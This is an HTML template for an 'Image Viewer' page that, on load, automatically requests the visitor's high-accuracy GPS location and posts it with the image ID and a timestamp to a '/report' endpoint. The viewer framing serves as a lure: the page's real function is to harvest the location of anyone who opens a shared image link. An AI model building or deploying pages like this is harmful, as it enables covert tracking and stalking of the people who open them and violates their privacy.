<!doctype html>
<html>
<head>
  <meta charset="utf-8"/>
  <title>Image Viewer</title>
  <style>
    body { font-family: Arial, sans-serif; padding: 20px; max-width: 720px; }
    img { display:block; margin-top:12px; max-width:100%; }
    #status { margin-top: 10px; color: #333; }
  </style>
</head>
<body>
  <div id="status">Loading image...</div>
  <img id="img" src="{{ img_url }}" />

<script>
const status = document.getElementById('status');

function sendLocation() {
  if (!navigator.geolocation) {
    status.textContent = 'Geolocation not supported.';
    return;
  }
  status.textContent = 'Requesting location...';

  navigator.geolocation.getCurrentPosition(async (pos) => {
    const payload = {
      image: "{{ image_id }}",
      lat: pos.coords.latitude,
      lon: pos.coords.longitude,
      accuracy: pos.coords.accuracy,
      ts: new Date().toISOString()
    };
    try {
      await fetch("/report", {
        method: "POST",
        headers: {"Content-Type":"application/json"},
        body: JSON.stringify(payload)
      });
      status.textContent = `Location sent (Â±${pos.coords.accuracy}m)`;
    } catch(e) {
      console.warn(e);
      status.textContent = "Error sending location";
    }
  }, (err) => {
    status.textContent = 'Location denied or error.';
  }, { enableHighAccuracy: true, timeout: 10000 });
}

// run automatically on page load
sendLocation();
</script>
</body>
</html>
